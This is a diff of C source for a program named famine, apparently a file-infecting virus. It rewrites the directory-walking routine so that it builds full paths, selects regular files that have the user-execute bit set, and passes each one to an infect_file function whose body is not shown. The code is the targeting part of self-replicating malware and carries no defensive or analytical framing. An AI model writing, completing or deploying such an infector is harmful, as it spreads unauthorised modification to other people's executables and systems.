@@ -4,25 +4,43 @@
 /// STATIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-static inline bool is_file (const unsigned char type)
+static inline bool is_infectable(const char *filename, const unsigned char type)
 {
-	return type == FILE_TYPE;
+	struct stat statbuf;
+
+	if (type != FILE_TYPE)
+		return false;
+
+	_stat(filename, &statbuf);
+
+	return statbuf.st_mode & S_IXUSR;
+}
+
+static inline void update_directory(struct directory *dir, const char *filename)
+{
+	const int limit = _strlen(filename);
+
+	_bzero(dir->buf, _strlen(dir->buf));
+
+	for (int index = 0; index < dir->size; index++)
+		dir->buf[index] = dir->path[index];
+	for (int index = 0; index < limit; index++)
+		dir->buf[dir->size + index] = filename[index];
 }
 
 ////////////////////////////////////////////////////////////////////////////////
 /// PUBLIC FUNCTION
 ////////////////////////////////////////////////////////////////////////////////
 
-void famine(const char *dir)
+void famine(struct directory *dir)
 {
-		
 	int fd = 0;
 	int index = 0;
 	int limit = 0;
 	char buf[BUFF_SIZE];
 	struct linux_dirent64 *dirp;
 
-	if ((fd = _open(dir, O_RDONLY | O_DIRECTORY, 0000)) == -1)
+	if ((fd = _open(dir->path, O_RDONLY | O_DIRECTORY, 0000)) == -1)
 		return ;
 	
 	while ((limit = _getdents64(fd, (struct linux_dirent64 *)buf, BUFF_SIZE)) > 0)
@@ -31,8 +49,10 @@ void famine(const char *dir)
 		{
 			dirp = (struct linux_dirent64 *)(buf + index);
 
-			if (is_file(dirp->d_type) == true)
-				infect_file(dirp->d_name);
+			update_directory(dir, dirp->d_name);
+
+			if (is_infectable(dir->buf, dirp->d_type) == true)
+				infect_file(dir->buf);
 
 			index += dirp->d_reclen;
 		}
